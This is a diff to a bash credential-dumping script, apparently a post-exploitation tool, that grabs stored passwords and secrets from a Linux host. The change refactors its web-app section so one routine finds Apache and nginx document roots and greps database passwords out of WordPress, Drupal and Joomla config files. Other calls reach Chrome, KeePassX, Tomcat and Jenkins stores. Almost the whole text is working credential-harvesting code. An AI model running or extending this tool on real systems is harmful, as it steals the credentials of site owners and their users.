@@ -1,7 +1,7 @@
 #! /bin/bash
 # If there is a will, there is a way
 #			0xMitsurugi
-# v0.0.4
+# v0.0.5
 
 ############## Credz dumper ##############################
 # This script will try to grab all stored password/secrets
@@ -232,7 +232,23 @@ _dump_keepassx() {
 	IFS=$OLDIFS
 }
 
-_dump_wordpress() {
+# _dump_webconf webconf cmsname
+_dump_webpass() {
+	if [ "$1" == "Wordpress" ]; then
+		GLOBALCREDZ=$(grep -B4 -A1 DB_PASSWORD $2)
+	else
+		if [ "$1" == "Drupal" ]; then
+			GLOBALCREDZ=$(grep -E -v "\w*\*" $2 | grep -B4 -A1 "password' =>" )
+		else
+			if  [ "$1" == "Joomla!" ]; then
+				GLOBALCREDZ=$(grep -A1 "\$user =" $2)
+			fi
+		fi
+	fi
+}
+
+# _dump_webconf filename cmsname
+_dump_webconf() {
 	#Webapps are a little weird. I don't make any assumptions such as userid
 	#Let try with anybody, and if we find a file, let's rock
 	#First, find WebRoot (apache? nginx? others?)
@@ -247,18 +263,19 @@ _dump_wordpress() {
 			DOCROOT=$(grep 'DocumentRoot /' $site | grep -E -v "\w*#" | cut -d ' ' -f2)
 			OLDIFS=$IFS
 			IFS=$'\n'
-			WPCONF=$(find $DOCROOT -maxdepth 3 -name "wp-config.php*")
-			if [ ${#WPCONF} -gt 1 ]; then
-				#Sometimes we have other credz in wp-config.php such as ftp?
-				for wpconf in $WPCONF
-				do
-					CREDZ=$(grep -B4 -A1 DB_PASSWORD $wpconf)
-					_dump_name "Wordpress config file"
-					_print_win "$wpconf" "$CREDZ"
+			WEBCONF=$(find $DOCROOT -maxdepth 5 -name "$1*")
+			if [ ${#WEBCONF} -gt 1 ]; then
+				#Sometimes we have other credz in config file such as ftp?
+				for webconf in $WEBCONF
+				do					
+					_dump_webpass $2 $webconf
+					CREDZ=$GLOBALCREDZ
+					_dump_name "$2 config file"
+					_print_win "$webconf" "$CREDZ"
 				done
 			else
-				[ $VERBOSE -eq 1 ] && _dump_name "Wordpress config file"
-				_print_lose "$DOCROOT" "No wordpress wp-config.php found"
+				[ $VERBOSE -eq 1 ] && _dump_name "$1 config file"
+				_print_lose "$DOCROOT" "No $2 $1 found"
 			fi
 			IFS=$OLDIFS
 		done
@@ -274,84 +291,20 @@ _dump_wordpress() {
 			if [ -d $DOCROOT ]; then
 				OLDIFS=$IFS
 				IFS=$'\n'
-				WPCONF=$(find $DOCROOT -maxdepth 3 -name "wp-config.php*")
+				WEBCONF=$(find $DOCROOT -maxdepth 5 -name "$1*")
 			
-				if [ ${#WPCONF} -gt 1 ]; then
-					#Sometimes we have other credz in wp-config.php such as ftp?
-					for wpconf in $WPCONF
+				if [ ${#WEBCONF} -gt 1 ]; then
+					#Sometimes we have other credz in config file such as ftp?
+					for webconf in $WEBCONF
 					do
-						CREDZ=$(grep -B4 -A1 DB_PASSWORD $wpconf)
-						_dump_name "Wordpress config file"
-						_print_win "$wpconf" "$CREDZ"
+						_dump_webpass $2 $webconf
+						CREDZ=$GLOBALCREDZ
+						_dump_name "$2 config file"
+						_print_win "$webconf" "$CREDZ"
 					done
 				else
-					[ $VERBOSE -eq 1 ] && _dump_name "Wordpress config file"
-					_print_lose "$DOCROOT" "No wordpress wp-config.php found"
-				fi
-				IFS=$OLDIFS
-			fi
-		done
-	fi
-
-
-}
-
-_dump_drupal() {
-	#And now drupal
-	#Maybe use same code with wordpress?
-
-	# Verify Apache web server
-	if [ -d /etc/apache2/sites-available/ ]; then
-		for site in /etc/apache2/sites-available/*
-		do
-			#This regex avoids comments
-			#Are we sure we have one and only one DocumentRoot in conf file?
-			DOCROOT=$(grep 'DocumentRoot /' $site | grep -E -v "\w*#" | cut -d ' ' -f2)
-			OLDIFS=$IFS
-			IFS=$'\n'
-			DRUPALCONF=$(find $DOCROOT/ -maxdepth 5 -name "settings.php*")
-			if [ ${#DRUPALCONF} -gt 1 ]; then
-				for drupalconf in $DRUPALCONF
-				do
-					#Sometimes we have other credz in settings.php?
-					CREDZ=$(grep -E -v "\w*\*" $drupalconf | grep -B4 -A1 "password' =>" )
-					if [ ${#CREDZ} -gt 1 ]; then
-						_dump_name "Drupal config file"
-						_print_win "$drupalconf" "$CREDZ"
-					fi
-				done
-			else
-				[ $VERBOSE -eq 1 ] && _dump_name "Drupal config file"
-				_print_lose "$DOCROOT" "No drupal settings.php found"
-			fi
-			IFS=$OLDIFS
-		done
-	fi
-
-	# Verify Nginx web server
-	if [ -d /etc/nginx/sites-available/ ]; then
-		for site in /etc/nginx/sites-available/*
-		do
-			#This regex avoids comments
-			#Are we sure we have one and only one root in conf file?
-			DOCROOT=$(egrep -i 'root /' $site | grep -E -v "\w*#" | sed -e 's/^.*root//' | cut -d ' ' -f 2 | tr -d ';')
-			if [ -d $DOCROOT ]; then
-				OLDIFS=$IFS
-				IFS=$'\n'
-				DRUPALCONF=$(find $DOCROOT/ -maxdepth 5 -name "settings.php*")
-				if [ ${#DRUPALCONF} -gt 1 ]; then
-					for drupalconf in $DRUPALCONF
-					do
-						#Sometimes we have other credz in settings.php?
-						CREDZ=$(grep -E -v "\w*\*" $drupalconf | grep -B4 -A1 "password' =>" )
-						if [ ${#CREDZ} -gt 1 ]; then
-							_dump_name "Drupal config file"
-							_print_win "$drupalconf" "$CREDZ"
-						fi
-					done
-				else
-					[ $VERBOSE -eq 1 ] && _dump_name "Drupal config file"
-					_print_lose "$DOCROOT" "No drupal settings.php found"
+					[ $VERBOSE -eq 1 ] && _dump_name "$2 config file"
+					_print_lose "$DOCROOT" "No $2 $1 found"
 				fi
 				IFS=$OLDIFS
 			fi
@@ -554,8 +507,12 @@ _loop_users _dump_chrome_user
 #Find tomcat home, dump admin pass 
 #How to find tomcat home reliably???
 _paragraph "WEB APPS!"
-_dump_wordpress
-_dump_drupal
+GLOBALCREDZ=0
+#_dump_wordpress
+#_dump_drupal
+_dump_webconf "wp-config.php" "Wordpress"
+_dump_webconf "settings.php" "Drupal"
+_dump_webconf "configuration.php" "Joomla!"
 _dump_tomcat
 _dump_jenkins
 #Add Directory Alias apache config?
@@ -564,4 +521,3 @@ _dump_jenkins
 
 #Databases
 #find mysql file, postgresql file, etc..
-
